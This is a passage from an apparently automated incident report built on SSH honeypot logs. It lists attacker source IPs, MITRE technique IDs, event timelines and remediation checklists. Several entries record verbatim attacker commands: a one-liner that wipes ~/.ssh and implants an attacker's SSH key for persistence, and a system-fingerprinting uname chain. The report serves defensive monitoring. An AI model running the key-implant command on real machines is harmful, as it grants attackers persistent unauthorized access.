| `2026-06-30 13:18:35` | `cowrie.login.success` |
| `2026-06-30 13:18:36` | `cowrie.session.params` |
| `2026-06-30 13:18:36` | `cowrie.command.input` |
| `2026-06-30 13:18:36` | `cowrie.command.input` |
| `2026-06-30 13:18:36` | `cowrie.command.input` |
| `2026-06-30 13:18:36` | `cowrie.command.input` |
| `2026-06-30 13:18:36` | `cowrie.command.input` |
| `2026-06-30 13:18:36` | `cowrie.command.success` |
| `2026-06-30 13:18:36` | `cowrie.command.input` |
| `2026-06-30 13:18:36` | `cowrie.command.input` |
| `2026-06-30 13:18:36` | `cowrie.command.input` |
| `2026-06-30 13:18:36` | `cowrie.command.input` |
| `2026-06-30 13:18:36` | `cowrie.log.closed` |
| `2026-06-30 13:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eddbd726ab1

| Field | Detail |
|---|---|
| **Source IP** | `45.232.73[.]84` |
| **First Seen** | 2026-06-30 13:19 |
| **Last Seen** | 2026-06-30 13:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:19:23` | `cowrie.session.connect` |
| `2026-06-30 13:19:23` | `cowrie.client.version` |
| `2026-06-30 13:19:23` | `cowrie.client.kex` |
| `2026-06-30 13:19:24` | `cowrie.login.success` |
| `2026-06-30 13:19:25` | `cowrie.session.params` |
| `2026-06-30 13:19:25` | `cowrie.command.input` |
| `2026-06-30 13:19:25` | `cowrie.command.failed` |
| `2026-06-30 13:19:25` | `cowrie.log.closed` |
| `2026-06-30 13:19:26` | `cowrie.session.params` |
| `2026-06-30 13:19:26` | `cowrie.command.input` |
| `2026-06-30 13:19:26` | `cowrie.session.file_download` |
| `2026-06-30 13:19:26` | `cowrie.log.closed` |
| `2026-06-30 13:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.232.73[.]84` to AbuseIPDB if not already reported
- [ ] Block `45.232.73[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b491f719d358

| Field | Detail |
|---|---|
| **Source IP** | `45.232.73[.]84` |
| **First Seen** | 2026-06-30 13:19 |
| **Last Seen** | 2026-06-30 13:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:19:26` | `cowrie.session.connect` |
| `2026-06-30 13:19:26` | `cowrie.client.version` |
| `2026-06-30 13:19:26` | `cowrie.client.kex` |
| `2026-06-30 13:19:27` | `cowrie.login.success` |
| `2026-06-30 13:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.232.73[.]84` to AbuseIPDB if not already reported
- [ ] Block `45.232.73[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d7fcd8dd399

| Field | Detail |
|---|---|
| **Source IP** | `45.232.73[.]84` |
| **First Seen** | 2026-06-30 13:19 |
| **Last Seen** | 2026-06-30 13:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:19:27` | `cowrie.session.connect` |
| `2026-06-30 13:19:27` | `cowrie.client.version` |
| `2026-06-30 13:19:27` | `cowrie.client.kex` |
| `2026-06-30 13:19:28` | `cowrie.login.success` |
| `2026-06-30 13:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.232.73[.]84` to AbuseIPDB if not already reported
- [ ] Block `45.232.73[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-933e9b7791a2

| Field | Detail |
|---|---|
| **Source IP** | `138.124.69[.]150` |
| **First Seen** | 2026-06-30 13:19 |
| **Last Seen** | 2026-06-30 13:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:19:38` | `cowrie.session.connect` |
| `2026-06-30 13:19:38` | `cowrie.client.version` |
| `2026-06-30 13:19:38` | `cowrie.client.kex` |
| `2026-06-30 13:19:39` | `cowrie.login.success` |
| `2026-06-30 13:19:39` | `cowrie.session.params` |
| `2026-06-30 13:19:39` | `cowrie.command.input` |
| `2026-06-30 13:19:39` | `cowrie.command.failed` |
| `2026-06-30 13:19:40` | `cowrie.log.closed` |
| `2026-06-30 13:19:41` | `cowrie.session.params` |
| `2026-06-30 13:19:41` | `cowrie.command.input` |
| `2026-06-30 13:19:41` | `cowrie.session.file_download` |
| `2026-06-30 13:19:41` | `cowrie.log.closed` |
| `2026-06-30 13:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.69[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.69[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7da93c890c95

| Field | Detail |
|---|---|
| **Source IP** | `138.124.69[.]150` |
| **First Seen** | 2026-06-30 13:19 |
| **Last Seen** | 2026-06-30 13:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:19:41` | `cowrie.session.connect` |
| `2026-06-30 13:19:41` | `cowrie.client.version` |
| `2026-06-30 13:19:41` | `cowrie.client.kex` |
| `2026-06-30 13:19:42` | `cowrie.login.success` |
| `2026-06-30 13:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.69[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.69[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e6eee95cbf4

| Field | Detail |
|---|---|
| **Source IP** | `138.124.69[.]150` |
| **First Seen** | 2026-06-30 13:19 |
| **Last Seen** | 2026-06-30 13:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:19:42` | `cowrie.session.connect` |
| `2026-06-30 13:19:42` | `cowrie.client.version` |
| `2026-06-30 13:19:42` | `cowrie.client.kex` |
| `2026-06-30 13:19:42` | `cowrie.login.success` |
| `2026-06-30 13:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.69[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.69[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b422eaa033a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 13:23 |
| **Last Seen** | 2026-06-30 13:23 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:23:20` | `cowrie.session.connect` |
| `2026-06-30 13:23:22` | `cowrie.client.version` |
| `2026-06-30 13:23:22` | `cowrie.client.kex` |
| `2026-06-30 13:23:28` | `cowrie.login.success` |
| `2026-06-30 13:23:32` | `cowrie.session.params` |
| `2026-06-30 13:23:32` | `cowrie.command.input` |
| `2026-06-30 13:23:33` | `cowrie.log.closed` |
| `2026-06-30 13:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3798a645acea

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 13:24 |
| **Last Seen** | 2026-06-30 13:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:24:52` | `cowrie.session.connect` |
| `2026-06-30 13:24:52` | `cowrie.client.version` |
| `2026-06-30 13:24:52` | `cowrie.client.kex` |
| `2026-06-30 13:24:54` | `cowrie.login.success` |
| `2026-06-30 13:24:55` | `cowrie.session.params` |
| `2026-06-30 13:24:55` | `cowrie.command.input` |
| `2026-06-30 13:24:56` | `cowrie.log.closed` |
| `2026-06-30 13:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6b38c2e39fa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 13:25 |
| **Last Seen** | 2026-06-30 13:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:25:31` | `cowrie.session.connect` |
| `2026-06-30 13:25:31` | `cowrie.client.version` |
| `2026-06-30 13:25:31` | `cowrie.client.kex` |
| `2026-06-30 13:25:31` | `cowrie.login.success` |
| `2026-06-30 13:25:32` | `cowrie.session.params` |
| `2026-06-30 13:25:32` | `cowrie.command.input` |
| `2026-06-30 13:25:32` | `cowrie.command.input` |
| `2026-06-30 13:25:32` | `cowrie.command.input` |
| `2026-06-30 13:25:32` | `cowrie.command.input` |
| `2026-06-30 13:25:32` | `cowrie.command.input` |
| `2026-06-30 13:25:32` | `cowrie.command.success` |
| `2026-06-30 13:25:32` | `cowrie.command.input` |
| `2026-06-30 13:25:32` | `cowrie.command.input` |
| `2026-06-30 13:25:32` | `cowrie.command.input` |
| `2026-06-30 13:25:32` | `cowrie.command.input` |
| `2026-06-30 13:25:32` | `cowrie.log.closed` |
| `2026-06-30 13:25:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4985a1a10cd3

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-06-30 13:31 |
| **Last Seen** | 2026-06-30 13:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:31:02` | `cowrie.session.connect` |
| `2026-06-30 13:31:02` | `cowrie.client.version` |
| `2026-06-30 13:31:02` | `cowrie.client.kex` |
| `2026-06-30 13:31:02` | `cowrie.login.success` |
| `2026-06-30 13:31:03` | `cowrie.session.params` |
| `2026-06-30 13:31:03` | `cowrie.command.input` |
| `2026-06-30 13:31:03` | `cowrie.command.failed` |
| `2026-06-30 13:31:03` | `cowrie.log.closed` |
| `2026-06-30 13:31:04` | `cowrie.session.params` |
| `2026-06-30 13:31:04` | `cowrie.command.input` |
| `2026-06-30 13:31:04` | `cowrie.session.file_download` |
| `2026-06-30 13:31:04` | `cowrie.log.closed` |
| `2026-06-30 13:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214507465eef

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-06-30 13:31 |
| **Last Seen** | 2026-06-30 13:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:31:05` | `cowrie.session.connect` |
| `2026-06-30 13:31:05` | `cowrie.client.version` |
| `2026-06-30 13:31:05` | `cowrie.client.kex` |
| `2026-06-30 13:31:05` | `cowrie.login.success` |
| `2026-06-30 13:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bb16af520ae

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-06-30 13:31 |
| **Last Seen** | 2026-06-30 13:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:31:05` | `cowrie.session.connect` |
| `2026-06-30 13:31:05` | `cowrie.client.version` |
| `2026-06-30 13:31:06` | `cowrie.client.kex` |
| `2026-06-30 13:31:06` | `cowrie.login.success` |
| `2026-06-30 13:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf44f877e44

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 13:32 |
| **Last Seen** | 2026-06-30 13:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:32:16` | `cowrie.session.connect` |
| `2026-06-30 13:32:16` | `cowrie.client.version` |
| `2026-06-30 13:32:16` | `cowrie.client.kex` |
| `2026-06-30 13:32:16` | `cowrie.login.success` |
| `2026-06-30 13:32:17` | `cowrie.session.params` |
| `2026-06-30 13:32:17` | `cowrie.command.input` |
| `2026-06-30 13:32:17` | `cowrie.command.input` |
| `2026-06-30 13:32:17` | `cowrie.command.input` |
| `2026-06-30 13:32:17` | `cowrie.command.input` |
| `2026-06-30 13:32:17` | `cowrie.command.input` |
| `2026-06-30 13:32:17` | `cowrie.command.success` |
| `2026-06-30 13:32:17` | `cowrie.command.input` |
| `2026-06-30 13:32:17` | `cowrie.command.input` |
| `2026-06-30 13:32:17` | `cowrie.command.input` |
| `2026-06-30 13:32:17` | `cowrie.command.input` |
| `2026-06-30 13:32:17` | `cowrie.log.closed` |
| `2026-06-30 13:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9db62b6b346

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 13:34 |
| **Last Seen** | 2026-06-30 13:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:34:38` | `cowrie.session.connect` |
| `2026-06-30 13:34:39` | `cowrie.client.version` |
| `2026-06-30 13:34:39` | `cowrie.client.kex` |
| `2026-06-30 13:34:44` | `cowrie.login.success` |
| `2026-06-30 13:34:48` | `cowrie.session.params` |
| `2026-06-30 13:34:48` | `cowrie.command.input` |
| `2026-06-30 13:34:49` | `cowrie.log.closed` |
| `2026-06-30 13:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22bc226070a8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 13:39 |
| **Last Seen** | 2026-06-30 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:39:30` | `cowrie.session.connect` |
| `2026-06-30 13:39:30` | `cowrie.client.version` |
| `2026-06-30 13:39:30` | `cowrie.client.kex` |
| `2026-06-30 13:39:31` | `cowrie.login.success` |
| `2026-06-30 13:39:31` | `cowrie.session.params` |
| `2026-06-30 13:39:31` | `cowrie.command.input` |
| `2026-06-30 13:39:31` | `cowrie.command.input` |
| `2026-06-30 13:39:31` | `cowrie.command.input` |
| `2026-06-30 13:39:31` | `cowrie.command.input` |
| `2026-06-30 13:39:31` | `cowrie.command.input` |
| `2026-06-30 13:39:31` | `cowrie.command.success` |
| `2026-06-30 13:39:31` | `cowrie.command.input` |
| `2026-06-30 13:39:31` | `cowrie.command.input` |
| `2026-06-30 13:39:31` | `cowrie.command.input` |
| `2026-06-30 13:39:31` | `cowrie.command.input` |
| `2026-06-30 13:39:32` | `cowrie.log.closed` |
| `2026-06-30 13:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17306f2b1435

| Field | Detail |
|---|---|
| **Source IP** | `35.205.202[.]250` |
| **First Seen** | 2026-06-30 13:39 |
| **Last Seen** | 2026-06-30 13:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:39:48` | `cowrie.session.connect` |
| `2026-06-30 13:39:48` | `cowrie.login.success` |
| `2026-06-30 13:39:48` | `cowrie.session.params` |
| `2026-06-30 13:39:48` | `cowrie.command.input` |
| `2026-06-30 13:39:48` | `cowrie.command.input` |
| `2026-06-30 13:39:48` | `cowrie.command.failed` |
| `2026-06-30 13:39:48` | `cowrie.command.input` |
| `2026-06-30 13:39:48` | `cowrie.log.closed` |
| `2026-06-30 13:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.202[.]250` to AbuseIPDB if not already reported
- [ ] Block `35.205.202[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c3911f2ff21

| Field | Detail |
|---|---|
| **Source IP** | `35.205.202[.]250` |
| **First Seen** | 2026-06-30 13:40 |
| **Last Seen** | 2026-06-30 13:40 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:40:01` | `cowrie.session.connect` |
| `2026-06-30 13:40:01` | `cowrie.login.success` |
| `2026-06-30 13:40:02` | `cowrie.session.params` |
| `2026-06-30 13:40:02` | `cowrie.command.input` |
| `2026-06-30 13:40:02` | `cowrie.command.failed` |
| `2026-06-30 13:40:17` | `cowrie.log.closed` |
| `2026-06-30 13:40:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.202[.]250` to AbuseIPDB if not already reported
- [ ] Block `35.205.202[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8d4cbebfc46

| Field | Detail |
|---|---|
| **Source IP** | `35.205.202[.]250` |
| **First Seen** | 2026-06-30 13:40 |
| **Last Seen** | 2026-06-30 13:40 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:40:03` | `cowrie.session.connect` |
| `2026-06-30 13:40:03` | `cowrie.login.success` |
| `2026-06-30 13:40:04` | `cowrie.session.params` |
| `2026-06-30 13:40:04` | `cowrie.command.input` |
| `2026-06-30 13:40:17` | `cowrie.log.closed` |
| `2026-06-30 13:40:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.202[.]250` to AbuseIPDB if not already reported
- [ ] Block `35.205.202[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c47ed8cea648

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 13:41 |
| **Last Seen** | 2026-06-30 13:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:41:27` | `cowrie.session.connect` |
| `2026-06-30 13:41:27` | `cowrie.client.version` |
| `2026-06-30 13:41:27` | `cowrie.client.kex` |
| `2026-06-30 13:41:30` | `cowrie.login.success` |
| `2026-06-30 13:41:31` | `cowrie.session.params` |
| `2026-06-30 13:41:31` | `cowrie.command.input` |
| `2026-06-30 13:41:32` | `cowrie.log.closed` |
| `2026-06-30 13:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52ba708bd2f9

| Field | Detail |
|---|---|
| **Source IP** | `134.112.56[.]47` |
| **First Seen** | 2026-06-30 13:42 |
| **Last Seen** | 2026-06-30 13:42 |
| **Session Duration** | 3s |
